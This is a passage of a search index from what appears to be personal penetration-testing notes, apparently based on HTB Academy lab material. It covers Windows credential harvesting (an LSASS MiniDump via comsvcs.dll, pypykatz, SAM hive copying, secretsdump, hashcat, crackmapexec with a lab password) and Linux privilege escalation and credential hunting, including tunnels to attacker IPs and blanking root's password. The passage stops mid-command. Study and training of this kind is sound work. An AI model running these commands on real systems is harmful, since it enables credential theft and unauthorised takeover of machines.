</ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#finding-lsass-pid-in-powershell","title":"Finding LSASS PID in PowerShell","text":"<p><code>Get-Process lsass</code> and see the process ID in the Id field.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#creating-lsassdmp-using-powershell","title":"Creating lsass.dmp using PowerShell","text":"<p>Once we have the PID assigned to the LSASS process, we can create the dump file. With an elevated PowerShell session, we can issue the following command to create the dump file: - <code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full</code></p> <p>With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.</p> <p>If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#using-pypykatz-to-extract-credentials","title":"Using Pypykatz to Extract Credentials","text":"<p>Once we have the dump file on our attack host, we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.</p> <p>Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a \"snapshot\" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out. Running Pypykatz</p> <p>The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:</p> <ul> <li><code>pypykatz lsa minidump /home/peter/Documents/lsass.dmp</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#msv","title":"MSV","text":"<p>MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT &amp; SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory. This will prove helpful in the final stage of our attack covered at the end of this section.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#wdigest","title":"WDIGEST","text":"<p>WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text. This means if we find ourselves targeting a Windows system with WDIGEST enabled, we will most likely see a password in clear-text. Modern Windows operating systems have WDIGEST disabled by default. Additionally, it is essential to note that Microsoft released a security update for systems affected by this issue with WDIGEST. We can study the details of that security update here.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#kerberos","title":"Kerberos","text":"<p>Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#dpapi","title":"DPAPI","text":"<p>The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications. Here are just a few examples of applications that use DPAPI and what they use it for:</p> Applications Use of DPAPI Internet Explorer Password form auto-completion data (username and password for saved sites). Google Chrome Password form auto-completion data (username and password for saved sites). Outlook Passwords for email accounts. Remote Desktop Connection Saved credentials for connections to remote machines. Credential Manager Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. <p>Mimikatz and Pypykatz can extract the DPAPI masterkey for the logged-on user whose data is present in LSASS process memory. This masterkey can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. DPAPI attack techniques are covered in greater detail in the Windows Privilege Escalation module.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingLSA/#cracking-the-nt-hash-with-hashcat","title":"Cracking the NT Hash with Hashcat","text":"<p>Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the Attacking SAM section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.</p> <ul> <li><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/","title":"Attacking SAM","text":"<p>With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section. Copying SAM Registry Hives</p> <p>There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below: Registry Hive   Description hklm\\sam    Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. hklm\\system     Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. hklm\\security   Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</p> <p>We can create backups of these hives using the reg.exe utility.</p>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/#using-regexe-save-to-copy-registry-hives","title":"Using reg.exe save to Copy Registry Hives","text":"<pre><code>reg.exe save hklm\\sam C:\\sam.save\nreg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/#dumping-hashes-with-impackets-secretsdumppy","title":"Dumping Hashes with Impacket's secretsdump.py","text":"<p>One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. Impacket can be found on most modern penetration testing distributions. We can check for it by using locate on a Linux-based system:</p> <ul> <li><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</code></li> <li><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/#cracking-hashes-with-hashcat","title":"Cracking Hashes with Hashcat","text":"<p>Once we have the hashes, we can start attempting to crack them using Hashcat. We will use it to attempt to crack the hashes we have gathered. If we take a glance at the Hashcat website, we will notice support for a wide array of hashing algorithms. In this module, we use Hashcat for specific use cases. This should help us develop the mindset &amp; understanding to use Hashcat as well as know when we need to reference Hashcat's documentation to understand what mode and options we need to use depending on the hashes we capture.</p> <p>As mentioned previously, we can populate a text file with the NT hashes we were able to dump.</p> <p>Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using -m to select the hash type 1000 to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's wiki page or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the Credential Storage section of this module.</p> <ul> <li><code>sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/#remote-dumping-lsa-secrets-considerations","title":"Remote Dumping &amp; LSA Secrets Considerations","text":""},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/#dumping-lsa-secrets-remotely","title":"Dumping LSA Secrets Remotely","text":"<ul> <li><code>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/CredentialHarvesting/WindowsLocalPassword/AttackingSAM/#dumping-sam-remotely","title":"Dumping SAM Remotely","text":"<ul> <li><code>crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/","title":"PRIVILEGE ESCALATION","text":""},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#basic","title":"Basic","text":""},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#_1","title":"PRIVILEGE ESCALATION","text":"<ul> <li><code>id</code> Check groups</li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#common-files-to-testretrive","title":"Common Files to test/retrive:","text":"<ul> <li><code>/etc/passwd</code> Users </li> <li><code>/var/www/</code> Folder that contains website code</li> <li><code>/etc/nginx/sites-available/</code> Folder that contains nginx configs</li> <li><code>/etc/nginx/sites-available/default</code> nginx Vhosts</li> <li><code>/etc/apache2/sites-enabled/</code> Folder that contains apache2 configs</li> <li><code>/etc/apache2/sites-enabled/000-default.conf</code> apache2 Vhosts</li> <li><code>/wp-config.php</code> Wordpress config</li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#files","title":"Files","text":"<ul> <li><code>find / -group sysadmin -writable -ls 2&gt;/dev/null | grep -v '/proc| /run |/sys'</code></li> <li><code>grep --color=auto -rnw '.' -ie password= --color=always 2&gt;/dev/null</code> grep --color=auto -rnw '.' -ie '$compares' --color=always 2&gt;/dev/null grep -r -h \"pass\" -v /var/www/html/CuteNews/cdata/users/ | base64 -d <code>grep -r -h -v \"php\" /var/www/html/CuteNews/cdata/users/ | base64 -d | sed \"s/}}/}}\\n/g\"</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#gtfo-bins","title":"GTFO BINS","text":""},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#sudo","title":"SUDO:","text":"<ul> <li><code>sudo -l</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#suid","title":"SUID:","text":"<ul> <li><code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code></li> <li><code>find / -perm -4000 2&gt;/dev/null</code></li> <li><code>find / -group staff 2&gt;/dev/null</code></li> <li><code>find / -type f -user svc_acc 2&gt;/dev/null</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#capabilities","title":"CAPABILITIES:","text":"<ul> <li><code>getcap -r / 2&gt;/dev/null</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#path","title":"PATH:","text":""},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#sudo-version","title":"Sudo Version:","text":"<ul> <li><code>sudo -V</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#lateral-movement","title":"LATERAL MOVEMENT","text":"<p>We will try to gain shell as another user. We can check home directory and /etc/passwd to check how many users exists.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#port-forwarding","title":"PORT FORWARDING:","text":""},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#check-open-ports","title":"CHECK OPEN PORTS","text":"<ul> <li><code>sudo netstat -tulpn | grep LISTEN</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#ssh-tunnel","title":"SSH TUNNEL:","text":""},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#remote-machine","title":"Remote machine:","text":"<ul> <li><code>ssh -N -f -R 3000:localhost:3000 -R 8001:localhost:8001 kali@10.10.14.119 -p 2222</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#local-machine","title":"Local machine:","text":"<pre><code>sudo nano /etc/ssh/sshd_config\n#port 22 to port 2222\nsudo service ssh start\n</code></pre> <pre><code>9001 on my local machine now forwards to remote machine port 80\nssh -L 9001:localhost:80 daniel@10.10.11.136\n</code></pre> <pre><code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\nssh -L 9001:10.10.11.136:80 daniel@10.10.11.136\n</code></pre>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#chisel","title":"CHISEL:","text":"<p><code>lsof -i:8080</code> Find PID to kill</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#local-machine_1","title":"Local machine:","text":"<p><code>chisel server --socks5 --reverse</code></p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#remote-machine_1","title":"Remote machine:","text":"<p>remote machine port 8000 that is locally only now forwards to 8000 on my local machine</p> <p><code>./chisel client --fingerprint Xs1Q7+QLIIs5kSWcfu9+Gzvk6t2J+HE7r4kNDCGeuAM= 10.10.14.5:8080 R:3306:127.0.0.1:3306</code></p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#credential-hunting-in-linux","title":"Credential Hunting in Linux","text":"<p>Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.</p> <p>We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example. Therefore, to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:</p> <p>Files   History     Memory  Key-Rings Configs     Logs    Cache   Browser stored credentials Databases   Command-line History    In-memory Processing   Notes          Scripts            Source codes           Cronjobs           SSH Keys    </p> <p>Enumerating all these categories will allow us to increase the probability of successfully finding out with some ease credentials of existing users on the system. There are countless different situations in which we will always see different results. Therefore, we should adapt our approach to the circumstances of the environment and keep the big picture in mind. Above all, it is crucial to keep in mind how the system works, its focus, what purpose it exists for, and what role it plays in the business logic and the overall network. For example, suppose it is an isolated database server. In that case, we will not necessarily find normal users there since it is a sensitive interface in the management of data to which only a few people are granted access.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#files_1","title":"Files","text":"<p>One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements. We should look for, find, and inspect several categories of files one by one. These categories are the following:</p> <p>Configuration files     Databases   Notes Scripts     Cronjobs    SSH keys</p> <p>Configuration files are the core of the functionality of services on Linux distributions. Often they even contain credentials that we will be able to read. Their insight also allows us to understand how the service works and its requirements precisely. Usually, the configuration files are marked with the following three file extensions (.config, .conf, .cnf). However, these configuration files or the associated extension files can be renamed, which means that these file extensions are not necessarily required. Furthermore, even when recompiling a service, the required filename for the basic configuration can be changed, which would result in the same effect. However, this is a rare case that we will not encounter often, but this possibility should not be left out of our search.</p> <p>The most crucial part of any system enumeration is to obtain an overview of it. Therefore, the first step should be to find all possible configuration files on the system, which we can then examine and analyze individually in more detail. There are many methods to find these configuration files, and with the following method, we will see we have reduced our search to these three file extensions.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#configuration-files","title":"Configuration Files","text":"<ul> <li><code>for l in $(echo \".conf .config .cnf\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"lib\\|fonts\\|share\\|core\" ;done</code></li> </ul> <p>Optionally, we can save the result in a text file and use it to examine the individual files one after the other. Another option is to run the scan directly for each file found with the specified file extension and output the contents. In this example, we search for three words (user, password, pass) in each file with the file extension .cnf.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#credentials-in-configuration-files","title":"Credentials in Configuration Files","text":"<ul> <li><code>for i in $(find / -name *.cnf 2&gt;/dev/null | grep -v \"doc\\|lib\");do echo -e \"\\nFile: \" $i; grep \"user\\|password\\|pass\" $i 2&gt;/dev/null | grep -v \"\\#\";done</code></li> </ul> <p>We can apply this simple search to the other file extensions as well. Additionally, we can apply this search type to databases stored in files with different file extensions, and we can then read those.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#databases","title":"Databases","text":"<p><code>for l in $(echo \".sql .db .*db .db*\");do echo -e \"\\nDB File extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\\|man\";done</code></p> <p>Depending on the environment we are in and the purpose of the host we are on, we can often find notes about specific processes on the system. These often include lists of many different access points or even their credentials. However, it is often challenging to find notes right away if stored somewhere on the system and not on the desktop or in its subfolders. This is because they can be named anything and do not have to have a specific file extension, such as .txt. Therefore, in this case, we need to search for files including the .txt file extension and files that have no file extension at all.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#notes","title":"Notes","text":"<ul> <li><code>find /home/* -type f -name \"*.txt\" -o ! -name \"*.*\"</code></li> </ul> <p>Scripts are files that often contain highly sensitive information and processes. Among other things, these also contain credentials that are necessary to be able to call up and execute the processes automatically. Otherwise, the administrator or developer would have to enter the corresponding password each time the script or the compiled program is called.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#scripts","title":"Scripts","text":"<ul> <li><code>for l in $(echo \".py .pyc .pl .go .jar .c .sh\");do echo -e \"\\nFile extension: \" $l; find / -name *$l 2&gt;/dev/null | grep -v \"doc\\|lib\\|headers\\|share\";done</code></li> </ul> <p>Cronjobs are independent execution of commands, programs, scripts. These are divided into the system-wide area (/etc/crontab) and user-dependent executions. Some applications and scripts require credentials to run and are therefore incorrectly entered in the cronjobs. Furthermore, there are the areas that are divided into different time ranges (/etc/cron.daily, /etc/cron.hourly, /etc/cron.monthly, /etc/cron.weekly). The scripts and files used by cron can also be found in /etc/cron.d/ for Debian-based distributions.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#cronjobs","title":"Cronjobs","text":"<ul> <li><code>cat /etc/crontab</code></li> <li><code>ls -la /etc/cron.*/</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#ssh-keys","title":"SSH Keys","text":"<p>SSH keys can be considered \"access cards\" for the SSH protocol used for the public key authentication mechanism. A file is generated for the client (Private key) and a corresponding one for the server (Public key). However, these are not the same, so knowing the public key is insufficient to find a private key. The public key can verify signatures generated by the private SSH key and thus enables automatic login to the server. Even if unauthorized persons get hold of the public key, it is almost impossible to calculate the matching private one from it. When connecting to the server using the private SSH key, the server checks whether the private key is valid and lets the client log in accordingly. Thus, passwords are no longer needed to connect via SSH.</p> <p>Since the SSH keys can be named arbitrarily, we cannot search them for specific names. However, their format allows us to identify them uniquely because, whether public key or private key, both have unique first lines to distinguish them.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#ssh-private-keys","title":"SSH Private Keys","text":"<ul> <li><code>grep -rnw \"PRIVATE KEY\" /home/* 2&gt;/dev/null | grep \":1\"</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#ssh-public-keys","title":"SSH Public Keys","text":"<ul> <li><code>grep -rnw \"ssh-rsa\" /home/* 2&gt;/dev/null | grep \":1\"</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#history","title":"History","text":"<p>All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes.</p> <p>In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in .bash_history. Nevertheless, other files like .bashrc or .bash_profile can contain important information. Bash History</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#bash-history","title":"Bash History","text":"<ul> <li><code>tail -n5 /home/*/.bash*</code></li> </ul> <p>An essential concept of Linux systems is log files that are stored in text files. Many programs, especially all services and the system itself, write such files. In them, we find system errors, detect problems regarding services or follow what the system is doing in the background. The entirety of log files can be divided into four categories: Application Logs    Event Logs  Service Logs    System Logs</p> <p>Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:</p> Log File Description /var/log/messages Generic system activity logs. /var/log/syslog Generic system activity logs. /var/log/auth.log (Debian) All authentication related logs. /var/log/secure (RedHat/CentOS) All authentication related logs. /var/log/boot.log Booting information. /var/log/dmesg Hardware and drivers related information and logs. /var/log/kern.log Kernel related warnings, errors and logs. /var/log/faillog Failed login attempts. /var/log/cron Information related to cron jobs. /var/log/mail.log All mail server related logs. /var/log/httpd All Apache related logs. /var/log/mysqld.log All MySQL server related logs. <p>Covering the analysis of these log files in detail would be inefficient in this case. So at this point, we should familiarize ourselves with the individual logs, first examining them manually and understanding their formats. However, here are some strings we can use to find interesting content in the logs:</p> <ul> <li><code>for i in $(ls /var/log/* 2&gt;/dev/null);do GREP=$(grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null); if [[ $GREP ]];then echo -e \"\\n#### Log file: \" $i; grep \"accepted\\|session opened\\|session closed\\|failure\\|failed\\|ssh\\|password changed\\|new user\\|delete user\\|sudo\\|COMMAND\\=\\|logs\" $i 2&gt;/dev/null;fi;done</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#memory-and-cache","title":"Memory and Cache","text":"<p>Many applications and processes work with credentials needed for authentication and store them either in memory or in files so that they can be reused. For example, it may be the system-required credentials for the logged-in users. Another example is the credentials stored in the browsers, which can also be read. In order to retrieve this type of information from Linux distributions, there is a tool called mimipenguin that makes the whole process easier. However, this tool requires administrator/root permissions.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#memory-mimipenguin","title":"Memory - Mimipenguin","text":"<ul> <li><code>sudo python3 mimipenguin.py</code></li> <li><code>sudo bash mimipenguin.sh</code></li> </ul> <p>An even more powerful tool we can use that was mentioned earlier in the Credential Hunting in Windows section is LaZagne. This tool allows us to access far more resources and extract the credentials. The passwords and hashes we can obtain come from the following sources but are not limited to:</p> Wifi Wpa_supplicant Libsecret Kwallet Chromium-based CLI Mozilla Thunderbird Git Env_variable Grub Fstab AWS Filezilla Gftp SSH Apache Shadow Docker KeePass Mimipy Sessions Keyrings <p>For example, Keyrings are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#memory-lazagne","title":"Memory - LaZagne","text":"<ul> <li><code>sudo python2.7 laZagne.py all</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#browsers","title":"Browsers","text":"<p>Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the Mozilla Firefox browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.</p> <p>For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in logins.json on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#firefox-stored-credentials","title":"Firefox Stored Credentials","text":"<ul> <li><code>ls -l .mozilla/firefox/ | grep default</code></li> <li><code>cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .</code></li> </ul> <p>The tool Firefox Decrypt is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, Firefox Decrypt 0.7.0 with Python 2 must be used.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#decrypting-firefox-credentials","title":"Decrypting Firefox Credentials","text":"<ul> <li><code>python3.9 firefox_decrypt.py</code></li> </ul> <p>Alternatively, LaZagne can also return results if the user has used the supported browser.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#browsers-lazagne","title":"Browsers - LaZagne","text":"<ul> <li><code>python3 laZagne.py browsers</code></li> </ul>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#passwd-shadow-opasswd","title":"Passwd, Shadow &amp; Opasswd","text":"<p>Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is Pluggable Authentication Modules (PAM). The modules used for this are called pam_unix.so or pam_unix2.so and are located in /usr/lib/x86_x64-linux-gnu/security/ in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with passwd, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.</p> <p>The pam_unix.so standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are /etc/passwd and /etc/shadow. PAM also has many other service modules, such as LDAP, mount, or Kerberos.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#passwd-file","title":"Passwd File","text":"<p>The /etc/passwd file contains information about every existing user on the system and can be read by all users and services. Each entry in the /etc/passwd file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (:) separates the information. Accordingly, such an entry may look something like this:</p> <p>Passwd Format cry0l1t3    :   x   :   1000    :   1000    :   cry0l1t3,,,     :   /home/cry0l1t3  :   /bin/bash Login name      Password info       UID         GUID        Full name/comments      Home directory      Shell</p> <p>The most interesting field for us is the Password information field in this section because there can be different entries here. One of the rarest cases that we may find only on very old systems is the hash of the encrypted password in this field. Modern systems have the hash values stored in the /etc/shadow file, which we will come back to later. Nevertheless, /etc/passwd is readable system-wide, giving attackers the possibility to crack the passwords if hashes are stored here.</p> <p>Usually, we find the value x in this field, which means that the passwords are stored in an encrypted form in the /etc/shadow file. However, it can also be that the /etc/passwd file is writeable by mistake. This would allow us to clear this field for the user root so that the password info field is empty. This will cause the system not to send a password prompt when a user tries to log in as root.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#editing-etcpasswd-before","title":"Editing /etc/passwd - Before","text":"<p>root:x:0:0:root:/root:/bin/bash</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#editing-etcpasswd-after","title":"Editing /etc/passwd - After","text":"<p>root::0:0:root:/root:/bin/bash</p> <p>Even though the cases shown will rarely occur, we should still pay attention and watch for security gaps because there are applications that require us to set specific permissions for entire folders. If the administrator has little experience with Linux or the applications and their dependencies, the administrator may give write permissions to the /etc directory and forget to correct them.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#shadow-file","title":"Shadow File","text":"<p>Since reading the password hash values can put the entire system in danger, the file /etc/shadow was developed, which has a similar format to /etc/passwd but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the /etc/shadow file for a user in /etc/passwd, the user is considered invalid. The /etc/shadow file is also only readable by users who have administrator rights. The format of this file is divided into nine fields:</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#shadow-format","title":"Shadow Format","text":"<p>cry0l1t3    :   $6$wBRzy$...SNIP...x9cDWUxW1    :   18937   :   0   :   99999   :   7   :   :   : Username        Encrypted password      Last PW change      Min. PW age         Max. PW age         Warning period  Inactivity period   Expiration date     Unused</p> <p>If the password field contains a character, such as ! or *, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the encrypted password field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The encrypted password also has a particular format by which we can also find out some information:</p> <pre><code>- $&lt;type&gt;$&lt;salt&gt;$&lt;hashed&gt;\n</code></pre> <p>As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following: Algorithm Types</p> <pre><code>- `$1$-MD5`\n- `$2a$ -Blowfish`\n- `$2y$ - Eksblowfish`\n- `$5$ - SHA-256`\n- `$6$ - SHA-512`\n</code></pre> <p>By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#opasswd","title":"Opasswd","text":"<p>The PAM library (pam_unix.so) can prevent reusing old passwords. The file where old passwords are stored is the /etc/security/opasswd. Administrator/root permissions are also required to read the file if the permissions for this file have not been changed manually.</p> <ul> <li><code>cat /etc/security/opasswd</code></li> <li><code>cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1</code></li> </ul> <p>Looking at the contents of this file, we can see that it contains several entries for the user cry0l1t3, separated by a comma (,). Another critical point to pay attention to is the hashing type that has been used. This is because the MD5 ($1$) algorithm is much easier to crack than SHA-512. This is especially important for identifying old passwords and maybe even their pattern because they are often used across several services or applications. We increase the probability of guessing the correct password many times over based on its pattern.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#cracking-linux-credentials","title":"Cracking Linux Credentials","text":"<p>Once we have collected some hashes, we can try to crack them in different ways to get the passwords in cleartext.</p>"},{"location":"old/Phases/4-PostExploitation/PrivilegeEscalation/Linux/#unshadow","title":"Unshadow","text":"<pre><code>sudo 